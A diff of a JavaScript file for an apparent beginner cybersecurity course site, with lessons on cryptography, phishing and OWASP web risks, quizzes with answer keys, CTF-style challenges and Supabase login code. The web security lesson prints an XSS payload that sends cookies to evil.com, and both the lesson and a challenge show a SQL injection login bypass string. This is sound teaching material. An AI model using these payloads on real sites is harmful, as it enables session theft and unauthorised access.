+  ✓ Understanding of ports, services, reconnaissance
+  ✓ Log analysis for threat detection</div>
+          <div class="warn-box">⚠️ <div>Now complete the Month 1 End-of-Month Checklist from your study plan. If you cannot do everything on the list from memory, identify your weak areas and go back to practice them before moving to Month 2.</div></div>
+          <h3>// Next: Month 2 — Networking Deep Dive</h3>
+          <p>Month 2 takes everything you just used practically (nmap, ports, protocols) and explains what is happening at the packet level. You will use Wireshark to see actual network traffic, understand TCP handshakes, and learn how protocols are abused in attacks. The foundation you built this month makes Month 2 click.</p>
+        </div>`,
+        video:'https://www.youtube.com/embed/3Kq1MIfTWCE',
+        quiz:[
+          {q:'What advantage does using ThreadPoolExecutor give the port scanner?',opts:['It makes the code look professional','It scans multiple ports simultaneously instead of sequentially — dramatically reducing scan time','It encrypts the scan traffic','It hides the scan from IDS systems'],correct:1,exp:'Sequential scanning waits for each port to respond before trying the next. ThreadPoolExecutor runs many connections simultaneously — a 1000-port scan that takes 20 minutes sequentially might take 30 seconds with 100 threads.',trick:false},
+          {q:'TRICK: A faster port scanner that uses many threads is harder for intrusion detection systems to detect.',opts:['True','False'],correct:1,exp:'FALSE. Fast, high-volume scanning is EASIER to detect. A slow, sequential scan that mimics normal traffic is harder to detect. Speed and stealth are opposites in port scanning.',trick:true},
+          {q:'In the scanner, what does "if __name__ == \'__main__\'" do?',opts:['Checks if the script is running as root','Ensures the scan code only runs when the script is executed directly — not when imported as a module','Checks the Python version','Sets the script name'],correct:1,exp:'"__name__" is "__main__" only when Python runs the file directly. If another script imports your scanner, this block does not execute — allowing your functions to be reused without triggering a scan.',trick:false},
+          {q:'The script uses "sys.exit(1)" when it cannot resolve a hostname. Why exit with 1 instead of 0?',opts:['1 is faster to exit','Exit code 1 signals an error — other scripts checking the exit code know something went wrong','It is just convention with no real purpose','0 is reserved for crashes'],correct:1,exp:'Exit code 0 = success, non-zero = failure. When a script fails, exiting with 1 (or other non-zero) allows wrapper scripts, CI/CD pipelines, and automation to detect and handle the failure.',trick:false},
+          {q:'You run your port scanner against 127.0.0.1 and see port 22 listed as open. What does this tell you?',opts:['Your machine is being hacked','An SSH server is running and listening on your machine','Port 22 is the default — it is always open','The scan is malfunctioning'],correct:1,exp:'Port 22 open means an SSH daemon (sshd) is running and accepting connections. In WSL this may or may not be running by default. If you did not intentionally enable SSH, investigate: "systemctl status ssh".',trick:false},
+          {q:'TRICK: The PORT_NAMES dictionary in the scanner accurately identifies what service is running on each port.',opts:['True','False'],correct:1,exp:'FALSE. PORT_NAMES maps COMMON services to their well-known ports — but any service can run on any port. An attacker might run an SSH server on port 80. To truly identify services, use nmap -sV which banner-grabs and fingerprints the actual running software.',trick:true},
+          {q:'After completing Month 1, you have two tools on GitHub. Why does this matter for job hunting?',opts:['It does not matter — employers only look at certifications','GitHub repositories show practical skill — interviewers can read your code and see how you think and solve problems','GitHub is only for software developers, not security professionals','Only famous open-source projects matter'],correct:1,exp:'Portfolio projects on GitHub show you can build things — not just pass tests. A well-documented port scanner demonstrates Python, networking knowledge, and initiative. Many security hiring managers review candidates\' GitHub before interviews.',trick:false},
+          {q:'What is "concurrent.futures.as_completed(futures)" doing in the scanner?',opts:['Running futures one at a time','Yielding results as each thread finishes — allowing you to process results immediately rather than waiting for all threads to complete','Sorting the results by port number','Cancelling slow futures'],correct:1,exp:'as_completed() is a generator that yields each future as it finishes, in the order they complete (not the order they were submitted). This lets you print open ports immediately as they are found rather than waiting for the entire scan.',trick:false},
+          {q:'TRICK: Port scanners like the one built here are classified as hacking tools and are illegal to possess.',opts:['True','False'],correct:1,exp:'FALSE. Port scanners like nmap and custom Python scanners are legal security tools. They are illegal to USE against systems you do not own or have authorization to test — but the tools themselves are legal. nmap is pre-installed on most Linux systems and used by millions of IT professionals daily.',trick:true},
+          {q:'Completing Month 1, you should feel comfortable doing what without Googling?',opts:['Exploit active directory','Navigate Linux, write bash scripts, write basic Python network scripts, and use nmap for port scanning','Configure enterprise firewalls','Conduct full penetration tests'],correct:1,exp:'Month 1 builds Linux fluency, scripting ability, and basic tool usage. The goal is comfort with the terminal, basic automation, and understanding what your tools actually do. Advanced exploitation comes in later months.',trick:false},
+        ]
+      }
+    ]
+  },
+  {
+    id:'m3', icon:'🔑', title:'Cryptography', desc:'Understand encryption, hashing, public/private keys and how data is kept secret online.',
+    lessons:[
+      {
+        id:'m3l0', title:'Encryption & Hashing',
+        content:`<div class="lesson-text">
+          <h3>// What is Cryptography?</h3>
+          <p>Cryptography is the science of securing information by transforming it into an unreadable format. It's the foundation of secure communications on the internet — without it, all your passwords, messages and banking details would be visible to anyone.</p>
+          <h3>// Symmetric vs Asymmetric Encryption</h3>
+          <ul>
+            <li><strong style="color:var(--accent)">Symmetric</strong> — Same key used to encrypt and decrypt. Fast but key sharing is a problem. Example: AES-256</li>
+            <li><strong style="color:var(--accent2)">Asymmetric</strong> — Public key encrypts, private key decrypts. Slower but solves key sharing. Example: RSA-2048</li>
+          </ul>
+          <div class="code-block">// How HTTPS works (simplified):
+1. Browser gets server's PUBLIC key (from certificate)
+2. Browser encrypts a random session key with public key
+3. Server decrypts session key with its PRIVATE key
+4. Both now share the session key securely
+5. All traffic encrypted with AES using that session key</div>
+          <h3>// Hashing</h3>
+          <p>A hash function converts any input into a fixed-length string. It's <strong>one-way</strong> — you cannot reverse it. This is why websites store password hashes, not actual passwords.</p>
+          <div class="code-block">MD5("hello")    = 5d41402abc4b2a76b9719d911017c592
+SHA256("hello") = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c...
+bcrypt("hello") = $2b$12$... (includes salt — best for passwords)</div>
+          <div class="warn-box">⚠️ <div><strong>MD5 is broken</strong> — collisions have been found (two different inputs producing the same hash). Never use MD5 for security. Use SHA-256 minimum, or bcrypt for passwords.</div></div>
+        </div>`,
+        video:'https://www.youtube.com/embed/AQDCe585Lnc',
+        quiz:[
+          {q:'Which encryption type uses the same key to encrypt and decrypt?',opts:['Asymmetric','Symmetric','Hashing','PKI'],correct:1,exp:'Symmetric encryption uses one shared secret key for both encryption and decryption.',trick:false},
+          {q:'TRICK: Hashing and encryption are the same thing — both can be reversed.',opts:['True','False'],correct:1,exp:'FALSE. Hashing is one-way and cannot be reversed. Encryption is two-way — encrypted data can be decrypted with the right key.',trick:true},
+          {q:'In HTTPS, what is encrypted with the server\'s PUBLIC key?',opts:['The website content','The server\'s private key','A random session key','The user\'s password'],correct:2,exp:'The browser encrypts a random session key with the server\'s public key. Only the server\'s private key can decrypt it.',trick:false},
+          {q:'Why do websites store password hashes instead of actual passwords?',opts:['Hashes are shorter','If the database is stolen, attackers cannot reverse the hash to get passwords','Hashes are faster to compare','Passwords are too long to store'],correct:1,exp:'Hashing is one-way — even if attackers steal the database, they cannot reverse hashes to get the original passwords.',trick:false},
+          {q:'Which is the most secure option for storing user passwords?',opts:['MD5','SHA-1','SHA-256','bcrypt'],correct:3,exp:'bcrypt is specifically designed for password hashing. It includes a salt and is deliberately slow to resist brute-force attacks.',trick:false},
+          {q:'TRICK: RSA (asymmetric) encryption is faster than AES (symmetric) encryption.',opts:['True','False'],correct:1,exp:'FALSE. Asymmetric encryption like RSA is much slower than symmetric encryption like AES. This is why HTTPS uses RSA only to exchange a key, then switches to AES for actual data.',trick:true},
+          {q:'What is a "salt" in password hashing?',opts:['A type of encryption key','A random value added to a password before hashing to prevent rainbow table attacks','A hash algorithm','A type of cipher'],correct:1,exp:'A salt is a random value added to each password before hashing. This ensures two identical passwords produce different hashes.',trick:false},
+          {q:'What is a collision in hashing?',opts:['Two keys encrypting the same data','Two different inputs producing the same hash output','A hash that cannot be computed','A cracked encryption key'],correct:1,exp:'A collision is when two different inputs produce the same hash — this breaks the integrity of the hash function. MD5 is vulnerable to this.',trick:false},
+          {q:'TRICK: If two files have the same SHA-256 hash, they must be identical.',opts:['True — SHA-256 has never had a collision','False — SHA-256 has many known collisions'],correct:0,exp:'TRUE (currently). SHA-256 has no known practical collisions. If two files share the same SHA-256 hash, they are almost certainly identical — this is used for file verification.',trick:true},
+          {q:'Which type of encryption is used for the bulk of HTTPS traffic once the connection is established?',opts:['RSA (asymmetric)','AES (symmetric)','MD5 hashing','bcrypt'],correct:1,exp:'After the initial key exchange using RSA, HTTPS switches to AES symmetric encryption for actual data transfer — because AES is much faster.',trick:false},
+        ]
+      }
+    ]
+  },
+  {
+    id:'m4', icon:'🎭', title:'Social Engineering', desc:'Learn how attackers manipulate people psychologically — often the weakest link in security.',
+    lessons:[
+      {
+        id:'m4l0', title:'Phishing & Human Hacking',
+        content:`<div class="lesson-text">
+          <h3>// The Human Firewall</h3>
+          <p>No matter how secure the technology, humans are often the weakest link. Social engineering exploits human psychology rather than technical vulnerabilities. Even the most secure systems can be compromised through deception.</p>
+          <h3>// Types of Social Engineering</h3>
+          <ul>
+            <li><strong style="color:var(--accent3)">Phishing</strong> — Fake emails that trick you into revealing credentials or clicking malicious links</li>
+            <li><strong style="color:var(--accent3)">Spear Phishing</strong> — Targeted phishing aimed at specific individuals using personal information</li>
+            <li><strong style="color:var(--accent3)">Whaling</strong> — Spear phishing targeting executives (CEOs, CFOs)</li>
+            <li><strong style="color:var(--accent3)">Vishing</strong> — Voice phishing via phone calls</li>
+            <li><strong style="color:var(--accent3)">Smishing</strong> — SMS phishing via text messages</li>
+            <li><strong style="color:var(--accent3)">Pretexting</strong> — Creating a fake scenario (e.g. "I'm from IT support") to extract information</li>
+            <li><strong style="color:var(--accent3)">Baiting</strong> — Leaving infected USB drives for curious victims to find and plug in</li>
+          </ul>
+          <h3>// Red Flags of Phishing Emails</h3>
+          <ul>
+            <li>Urgent language: "Your account will be closed in 24 hours!"</li>
+            <li>Mismatched sender email (support@micros0ft.com — note the zero)</li>
+            <li>Suspicious links — always hover before clicking to see real destination</li>
+            <li>Requests for passwords, PINs or personal info via email</li>
+            <li>Poor spelling and grammar (though AI is making phishing more convincing)</li>
+          </ul>
+          <div class="tip-box">💡 <div>Always verify unexpected requests through a <strong>different</strong> communication channel. If your "bank" emails you, call the official number on the back of your card — don't use any number in the email.</div></div>
+        </div>`,
+        video:'https://www.youtube.com/embed/lc7scxvKQOo',
+        quiz:[
+          {q:'What is whaling in social engineering?',opts:['Phishing using whale images','Spear phishing targeting senior executives like CEOs','A type of network attack','Mass phishing emails sent to millions'],correct:1,exp:'Whaling targets "big fish" — senior executives like CEOs or CFOs — using highly personalized attacks.',trick:false},
+          {q:'TRICK: A well-written email with perfect grammar cannot be a phishing attempt.',opts:['True','False'],correct:1,exp:'FALSE. AI tools have made phishing emails much more convincing. Perfect grammar does NOT guarantee an email is legitimate.',trick:true},
+          {q:'What is pretexting?',opts:['Writing fake text messages','Creating a fabricated scenario to manipulate someone into giving information','Previewing a text before sending','A type of malware'],correct:1,exp:'Pretexting involves creating a believable false scenario (e.g. "I\'m your IT support") to manipulate victims into giving up information.',trick:false},
+          {q:'Someone leaves a USB drive in a company car park labelled "Salaries 2025". This is an example of:',opts:['Vishing','Pretexting','Baiting','Smishing'],correct:2,exp:'Baiting uses curiosity to trick victims into plugging in infected USB drives or clicking tempting links.',trick:false},
+          {q:'TRICK: Spear phishing and regular phishing use identical targeting approaches.',opts:['True','False'],correct:1,exp:'FALSE. Regular phishing sends generic emails to millions hoping some will fall for it. Spear phishing targets specific individuals using researched personal information.',trick:true},
+          {q:'You receive an urgent SMS from "your bank" saying your account is suspended. What should you do?',opts:['Click the link in the SMS immediately','Call the number provided in the SMS','Find your bank\'s official number independently and call that','Reply to the SMS with your account details'],correct:2,exp:'Always verify through an independent channel. Find the bank\'s official number on their website or the back of your card — never use contact details provided in a suspicious message.',trick:false},
+          {q:'What does a phishing email from "support@micros0ft.com" demonstrate?',opts:['A legitimate Microsoft email','Domain spoofing using a zero instead of the letter "o"','A secure Microsoft domain','An internal Microsoft communication'],correct:1,exp:'Attackers use look-alike domains (replacing "o" with "0") to fool victims who don\'t inspect email addresses carefully.',trick:false},
+          {q:'TRICK: Hovering over a link in an email is enough to confirm it is safe to click.',opts:['True','False'],correct:1,exp:'FALSE. Hovering shows you the destination URL, but attackers can use URL shorteners, redirects or typosquatting. Even if it looks right, be cautious with unexpected emails.',trick:true},
+          {q:'Which type of social engineering specifically uses phone calls?',opts:['Smishing','Vishing','Phishing','Pretexting'],correct:1,exp:'Vishing (Voice phishing) uses phone calls — attackers impersonate banks, government agencies or tech support.',trick:false},
+          {q:'What makes spear phishing more dangerous than regular phishing?',opts:['It uses more emails','It targets random people','It uses personal information to appear more convincing and legitimate','It is always automated'],correct:2,exp:'Spear phishing attackers research their targets first, using real names, job titles, colleagues and recent events to make their attacks far more convincing.',trick:false},
+        ]
+      }
+    ]
+  },
+  {
+    id:'m5', icon:'🌍', title:'Web Security', desc:'Learn about OWASP Top 10, SQL injection, XSS, CSRF and how to secure web applications.',
+    lessons:[
+      {
+        id:'m5l0', title:'OWASP Top 10 & Common Attacks',
+        content:`<div class="lesson-text">
+          <h3>// What is OWASP?</h3>
+          <p>The Open Web Application Security Project (OWASP) publishes the Top 10 most critical web application security risks. Every web developer and security professional must know these inside out.</p>
+          <h3>// OWASP Top 10 (2021)</h3>
+          <ul>
+            <li><strong style="color:var(--red)">A01</strong> — Broken Access Control (most common)</li>
+            <li><strong style="color:var(--red)">A02</strong> — Cryptographic Failures</li>
+            <li><strong style="color:var(--red)">A03</strong> — Injection (SQL, NoSQL, Command injection)</li>
+            <li><strong style="color:var(--red)">A04</strong> — Insecure Design</li>
+            <li><strong style="color:var(--red)">A05</strong> — Security Misconfiguration</li>
+            <li><strong style="color:var(--red)">A06</strong> — Vulnerable and Outdated Components</li>
+            <li><strong style="color:var(--red)">A07</strong> — Identification and Authentication Failures</li>
+            <li><strong style="color:var(--red)">A08</strong> — Software and Data Integrity Failures</li>
+            <li><strong style="color:var(--red)">A09</strong> — Security Logging and Monitoring Failures</li>
+            <li><strong style="color:var(--red)">A10</strong> — Server-Side Request Forgery (SSRF)</li>
+          </ul>
+          <h3>// SQL Injection</h3>
+          <div class="code-block">// Vulnerable login query:
+SELECT * FROM users WHERE username='$user' AND password='$pass'
+
+// Attacker enters username: admin'--
+// Query becomes:
+SELECT * FROM users WHERE username='admin'--' AND password='...'
+// The -- comments out the password check! Admin login bypassed.
+
+// Defense: Use parameterized queries / prepared statements</div>
+          <h3>// Cross-Site Scripting (XSS)</h3>
+          <p>XSS allows attackers to inject malicious JavaScript into web pages viewed by other users. It can steal cookies, session tokens or redirect users.</p>
+          <div class="code-block">// XSS payload example:
+&lt;script&gt;document.location='https://evil.com/?c='+document.cookie&lt;/script&gt;
+// If stored in a comment field and not sanitized, this runs for every visitor</div>
+          <div class="warn-box">⚠️ <div>Never trust user input. Always <strong>validate, sanitize and encode</strong> all data from users before using it in your application.</div></div>
+        </div>`,
+        video:'https://www.youtube.com/embed/WtHnT73NaaQ',
+        quiz:[
+          {q:'According to OWASP 2021, what is the #1 most common web vulnerability?',opts:['SQL Injection','Broken Access Control','Cryptographic Failures','Cross-Site Scripting'],correct:1,exp:'Broken Access Control moved to #1 in OWASP 2021 — it means users can act outside their intended permissions.',trick:false},
+          {q:'What does SQL injection exploit?',opts:['Weak passwords','Unsanitized user input in database queries','Unencrypted network traffic','Outdated software'],correct:1,exp:'SQL injection exploits applications that include unsanitized user input directly in SQL queries.',trick:false},
+          {q:'TRICK: Using HTTPS completely prevents SQL injection attacks.',opts:['True','False'],correct:1,exp:'FALSE. HTTPS encrypts traffic between client and server but does nothing to prevent SQL injection — which is a server-side input validation problem.',trick:true},
+          {q:'What is Cross-Site Scripting (XSS)?',opts:['Injecting SQL into a database','Injecting malicious JavaScript into web pages viewed by other users','Intercepting network traffic','Brute forcing passwords'],correct:1,exp:'XSS injects malicious scripts into web pages. When other users view the page, the script executes in their browser.',trick:false},
+          {q:'What is the best defense against SQL injection?',opts:['Using a firewall','Parameterized queries / prepared statements','Encrypting the database','Using HTTPS'],correct:1,exp:'Parameterized queries separate SQL code from user data — the database never treats user input as executable code.',trick:false},
+          {q:'TRICK: Broken Access Control means users cannot access the application at all.',opts:['True','False'],correct:1,exp:'FALSE. Broken Access Control means users CAN access things they should NOT be able to — like viewing another user\'s data or performing admin actions.',trick:true},
+          {q:'An attacker steals your session cookie using XSS. What can they now do?',opts:['Only view your profile','Log into your account without knowing your password','Delete your account permanently','Nothing — cookies are encrypted'],correct:1,exp:'Session cookies authenticate you to websites. If stolen, an attacker can use them to impersonate you and access your account without a password.',trick:false},
+          {q:'What does OWASP A06 (Vulnerable Components) refer to?',opts:['Weak passwords','Using software libraries with known security vulnerabilities','Broken login systems','Poor database design'],correct:1,exp:'A06 covers using outdated or vulnerable third-party libraries and components. Always keep dependencies updated.',trick:false},
+          {q:'TRICK: Validating user input on the client side (browser) is sufficient security.',opts:['True','False'],correct:1,exp:'FALSE. Client-side validation can be bypassed easily using browser developer tools. Always validate on the SERVER side — client-side validation is only for user experience.',trick:true},
+          {q:'What does SSRF (Server-Side Request Forgery) allow an attacker to do?',opts:['Forge email addresses','Make the server send requests to internal systems on the attacker\'s behalf','Steal SSL certificates','Inject SQL into databases'],correct:1,exp:'SSRF tricks the server into making HTTP requests to internal systems (like internal APIs or cloud metadata endpoints) that the attacker cannot directly access.',trick:false},
+        ]
+      }
+    ]
+  }
+];
+
+const CHALLENGES = [
+  {id:'c0', title:'Find the Hidden Flag', diff:'easy', module:'Intro to CyberSec', desc:'Cybersecurity competitions (CTFs) use "flags" — hidden strings you must find. Decode this Base64 string to find the flag:', code:'Q1RGe0Jhc2U2NF9pc19ub3RfZW5jcnlwdGlvbn0=', hint:'Use a Base64 decoder. Try: atob("Q1RGe0...") in your browser console (F12).', answer:'CTF{Base64_is_not_encryption}', xp:50},
+  {id:'c1', title:'What Port is This?', diff:'easy', module:'Networking', desc:'A network scan shows a service running. What common service runs on port 22?', hint:'Think about how you remotely and securely log into a Linux server.', answer:'SSH', xp:30},
+  {id:'c2', title:'Crack the Hash', diff:'medium', module:'Cryptography', desc:'This is an MD5 hash of a common word. What is the original word?\n\n5f4dcc3b5aa765d61d8327deb882cf99', hint:'This is one of the most commonly used (and worst) passwords in the world.', answer:'password', xp:75},
+  {id:'c3', title:'Spot the Phish', diff:'easy', module:'Social Engineering', desc:'Which of these email addresses is most likely a phishing attempt?\n\nA) support@microsoft.com\nB) support@micros0ft.com\nC) noreply@microsoft.com', hint:'Look very carefully at every character in each email address.', answer:'B', xp:40},
+  {id:'c4', title:'SQL Injection Basics', diff:'medium', module:'Web Security', desc:'Complete the SQL injection payload to bypass a login:\n\nUsername: admin\'__\nPassword: anything\n\nWhat two characters should replace the __ to comment out the rest of the query?', hint:'In SQL, these two characters start a comment and ignore everything after them.', answer:'--', xp:80},
+  {id:'c5', title:'Caesar Cipher', diff:'medium', module:'Cryptography', desc:'Decrypt this Caesar cipher (shift of 3):\n\nFEBHULWB', hint:'Caesar cipher shifts each letter back by the shift amount. A=X, B=Y, C=Z with shift 3.', answer:'SECURITY', xp:60},
+];
+
+// ══════════════════════════════════════════════
+// STATE
+// ══════════════════════════════════════════════
+let currentUser = null;
+let userProgress = { xp:0, completedLessons:[], passedQuizzes:[], solvedChallenges:[], level:0 };
+let currentModule = null;
+let currentLessonIdx = 0;
+let currentSection = 'lesson'; // 'lesson' | 'quiz'
+let quizState = { current:0, answers:[], score:0 };
+
+// ══════════════════════════════════════════════
+// SUPABASE AUTH
+// ══════════════════════════════════════════════
+async function sbAuth(path, body) {
+  const res = await fetch(SB_URL+'/auth/v1'+path, {
+    method:'POST',
+    headers:{'apikey':SB_KEY,'Content-Type':'application/json'},
+    body:JSON.stringify(body)
+  });
+  const data = await res.json();
+  if(!res.ok) throw new Error(data.error_description||data.msg||'Auth error');
+  return data;
+}
+
+async function sbSaveProgress() {
+  if(!currentUser) return;
+  await fetch(SB_URL+'/rest/v1/cyberlearn_progress', {
+    method:'POST',
+    headers:{
+      'apikey':SB_KEY,'Authorization':'Bearer '+currentUser.access_token,
+      'Content-Type':'application/json','Prefer':'resolution=merge-duplicates'
+    },
+    body:JSON.stringify({user_id:currentUser.id, progress:JSON.stringify(userProgress)})
+  });
+}
+
+async function sbLoadProgress() {
+  if(!currentUser) return;
+  const res = await fetch(SB_URL+'/rest/v1/cyberlearn_progress?user_id=eq.'+currentUser.id, {
+    headers:{'apikey':SB_KEY,'Authorization':'Bearer '+currentUser.access_token}
+  });
+  const data = await res.json();
+  if(data && data.length>0 && data[0].progress) {
+    userProgress = JSON.parse(data[0].progress);
+  }
+}
+
+// ══════════════════════════════════════════════
+// AUTH FUNCTIONS
+// ══════════════════════════════════════════════
+function showAuthTab(tab) {
+  document.querySelectorAll('.auth-tab').forEach((t,i)=>{
+    t.classList.toggle('active',['login','signup','reset'][i]===tab);
+  });
+  document.querySelectorAll('.auth-panel').forEach(p=>p.classList.remove('active'));
+  document.getElementById('panel-'+tab).classList.add('active');
+}
+
+async function doLogin() {
+  const email=document.getElementById('l-email').value.trim();
+  const pw=document.getElementById('l-pw').value;
+  const errEl=document.getElementById('l-err');
+  const btn=document.getElementById('l-btn');
+  errEl.textContent='';
+  if(!email||!pw){errEl.textContent='Please enter email and password.';return;}
+  btn.disabled=true;btn.textContent='Signing in…';
+  try{
+    const data=await sbAuth('/token?grant_type=password',{email,password:pw});
+    currentUser={...data.user,access_token:data.access_token};
+    await sbLoadProgress();
+    onLoginSuccess();
+  }catch(e){errEl.textContent='✕ '+(e.message==='Invalid login credentials'?'Incorrect email or password.':e.message);}
+  btn.disabled=false;btn.textContent='→ Sign In';
+}
+
+async function doSignup() {
+  const name=document.getElementById('s-name').value.trim();
+  const email=document.getElementById('s-email').value.trim();
+  const pw=document.getElementById('s-pw').value;
+  const pw2=document.getElementById('s-pw2').value;
+  const errEl=document.getElementById('s-err');
+  const okEl=document.getElementById('s-ok');
+  const btn=document.getElementById('s-btn');
+  errEl.textContent='';okEl.textContent='';
+  if(!name){errEl.textContent='Please enter your name.';return;}
+  if(pw.length<8){errEl.textContent='Password must be at least 8 characters.';return;}
+  if(pw!==pw2){errEl.textContent='Passwords do not match.';return;}
+  btn.disabled=true;btn.textContent='Creating account…';
+  try{
+    await sbAuth('/signup',{email,password:pw,data:{full_name:name}});
+    okEl.textContent='✅ Account created! Check your email to verify, then sign in.';
+  }catch(e){errEl.textContent='✕ '+e.message;}
+  btn.disabled=false;btn.textContent='→ Create Account';
+}
+
+async function doReset() {
+  const email=document.getElementById('r-email').value.trim();
+  const errEl=document.getElementById('r-err');
+  const okEl=document.getElementById('r-ok');
+  const btn=document.getElementById('r-btn');
+  errEl.textContent='';okEl.textContent='';
+  if(!email){errEl.textContent='Please enter your email.';return;}
+  btn.disabled=true;btn.textContent='Sending…';
+  try{
+    await fetch(SB_URL+'/auth/v1/recover',{method:'POST',headers:{'apikey':SB_KEY,'Content-Type':'application/json'},body:JSON.stringify({email})});
+    okEl.textContent='✅ Reset link sent to '+email;
+  }catch(e){errEl.textContent='✕ Could not send reset email.';}
+  btn.disabled=false;btn.textContent='→ Send Reset Link';
+}
+
+function doLogout() {
+  currentUser=null;
+  userProgress={xp:0,completedLessons:[],passedQuizzes:[],solvedChallenges:[],level:0};
+  document.getElementById('authScreen').classList.remove('hidden');
+  document.getElementById('l-email').value='';
+  document.getElementById('l-pw').value='';
+  switchPage('dashboard');
+}
+
+function onLoginSuccess() {
+  const name=currentUser.user_metadata?.full_name||currentUser.email?.split('@')[0]||'Hacker';
+  const initials=name.split(' ').map(n=>n[0]).join('').toUpperCase().slice(0,2);
+  document.getElementById('topAvatar').textContent=initials;
+  document.getElementById('topName').textContent=name.split(' ')[0];
+  document.getElementById('dashName').textContent=name.split(' ')[0];
+  document.getElementById('authScreen').classList.add('hidden');
+  updateXP();
+  renderDashboard();
+  renderChallenges();
+  renderProgress();
+  hideLoading();
+}
+
+// ══════════════════════════════════════════════
+// XP & LEVEL SYSTEM
+// ══════════════════════════════════════════════
+function addXP(amount) {
+  userProgress.xp += amount;
+  userProgress.level = Math.floor(userProgress.xp / 200);
+  updateXP();
+  sbSaveProgress();
+}
+
+function updateXP() {
+  const xp=userProgress.xp;
+  const level=userProgress.level;
+  const nextLevel=(level+1)*200;
+  const progress=((xp%200)/200)*100;
+  document.getElementById('xpLabel').textContent=xp+' XP';
+  document.getElementById('xpFill').style.width=progress+'%';
+  document.getElementById('levelBadge').textContent='LVL '+level;
+  document.getElementById('pr-xp').textContent=xp;
+  document.getElementById('pr-level').textContent=level;
+  document.getElementById('st-xp').textContent=xp;
+}
+
+// ══════════════════════════════════════════════
+// PAGE SWITCHING
+// ══════════════════════════════════════════════
+function switchPage(page) {
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+  const target=document.getElementById('page-'+page);
+  if(target) target.classList.add('active');
+  const navItem=document.querySelector(`.nav-item[data-page="${page}"]`);
+  if(navItem) navItem.classList.add('active');
+  if(page==='progress') renderProgress();
+}
+
+// ══════════════════════════════════════════════
+// DASHBOARD
+// ══════════════════════════════════════════════
+function renderDashboard() {
+  const completed=MODULES.filter(m=>m.lessons.every(l=>userProgress.completedLessons.includes(l.id))).length;
+  document.getElementById('st-modules').textContent=completed+'/'+MODULES.length;
+  document.getElementById('st-quizzes').textContent=userProgress.passedQuizzes.length;
+  document.getElementById('st-challenges').textContent=userProgress.solvedChallenges.length;
+
+  document.getElementById('modulesGrid').innerHTML=MODULES.map((m,i)=>{
+    const totalLessons=m.lessons.length;
+    const doneLessons=m.lessons.filter(l=>userProgress.completedLessons.includes(l.id)).length;
+    const pct=Math.round(doneLessons/totalLessons*100);
+    const isDone=pct===100;
+    const statusClass=isDone?'ms-done':'ms-new';
+    const statusText=isDone?'COMPLETE':'START';
+    return `<div class="module-card ${isDone?'completed':''}" onclick="openModule(${i})">
+      <div class="module-top">
+        <div class="module-icon">${m.icon}</div>
+        <div class="module-title">${m.title}</div>
+        <div class="module-desc">${m.desc}</div>
+        <div class="module-progress"><div class="module-progress-fill" style="width:${pct}%"></div></div>
+      </div>
+      <div class="module-bottom">
+        <div class="module-meta">${totalLessons} lesson${totalLessons!==1?'s':''} · ${pct}% done</div>
+        <div class="module-status ${statusClass}">${statusText}</div>
+      </div>
+    </div>`;
+  }).join('');
+
+  // Update nav badges
+  MODULES.forEach((m,i)=>{
+    const nb=document.getElementById('nb'+i);
+    if(!nb) return;
+    const done=m.lessons.every(l=>userProgress.completedLessons.includes(l.id));
+    nb.textContent=done?'✓':'NEW';
+    nb.className='nav-badge '+(done?'done':'');
+  });
+}
+
+// ══════════════════════════════════════════════
+// MODULE / LESSON
+// ══════════════════════════════════════════════
+function openModule(idx) {
+  currentModule=idx;
+  currentLessonIdx=0;
+  currentSection='lesson';
+  switchPage('module');
+  renderLesson();
+}
+
+function renderLesson() {
+  const mod=MODULES[currentModule];
+  const lesson=mod.lessons[currentLessonIdx];
+  document.getElementById('lessonModuleTitle').textContent=mod.title;
+  document.getElementById('lessonTitle').textContent=lesson.title;
+
+  // Nav list
+  document.getElementById('lessonNavList').innerHTML=mod.lessons.map((l,i)=>{
+    const done=userProgress.completedLessons.includes(l.id);
+    const active=i===currentLessonIdx;
+    return `<div class="lesson-nav-item ${done?'done':''} ${active?'active':''}" onclick="jumpLesson(${i})">
+      <div class="lesson-check ${done?'done':''} ${active&&!done?'active':''}">
+        ${done?'✓':i+1}
+      </div>
+      ${l.title}
+    </div>`;
+  }).join('');
+
+  // Main content
+  if(currentSection==='lesson') {
+    document.getElementById('lessonMain').innerHTML=`
+      <div class="lesson-card">
+        <div class="lesson-card-head">📖 Lesson Content</div>
+        <div class="lesson-card-body">${lesson.content}</div>
+      </div>
+      ${lesson.video?`
+      <div class="lesson-card">
+        <div class="lesson-card-head">🎥 Video Lesson</div>
+        <div class="lesson-card-body">
+          <div class="video-wrap">
+            <iframe src="${lesson.video}" frameborder="0" allowfullscreen></iframe>
+          </div>
+        </div>
+      </div>`:''}
+      <div style="display:flex;justify-content:flex-end;gap:.75rem;padding:.5rem 0;">
+        <button class="btn btn-primary" onclick="startQuiz()">Take Quiz →</button>
+      </div>`;
+    document.getElementById('nextLessonBtn').textContent='Take Quiz →';
+    document.getElementById('nextLessonBtn').onclick=startQuiz;
+  }
+}
+
+function jumpLesson(idx) {
+  currentLessonIdx=idx;
+  currentSection='lesson';
+  renderLesson();
+}
+
+function nextLesson() { startQuiz(); }
+
+// ══════════════════════════════════════════════
+// QUIZ
+// ══════════════════════════════════════════════
+function startQuiz() {
+  currentSection='quiz';
+  const lesson=MODULES[currentModule].lessons[currentLessonIdx];
+  quizState={current:0,answers:[],score:0,wrongAnswers:[]};
+  renderQuizQuestion(lesson.quiz);
+  document.getElementById('nextLessonBtn').textContent='Back to Lesson';
+  document.getElementById('nextLessonBtn').onclick=()=>{currentSection='lesson';renderLesson();};
+}
+
+function renderQuizQuestion(questions) {
+  const q=questions[quizState.current];
+  const letters=['A','B','C','D'];
+  const isTrick=q.trick;
+  document.getElementById('lessonMain').innerHTML=`
+    <div class="quiz-wrap">
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:1rem;">
+        <div class="quiz-progress" style="margin-bottom:0">
+          ${questions.map((_,i)=>`<div class="qp-dot ${i<quizState.current?'done':i===quizState.current?'active':''}"></div>`).join('')}
+        </div>
+        <div style="font-size:.72rem;color:var(--muted);font-family:'Space Mono',monospace;">${quizState.current+1}/${questions.length} · Need 90% to pass</div>
+      </div>
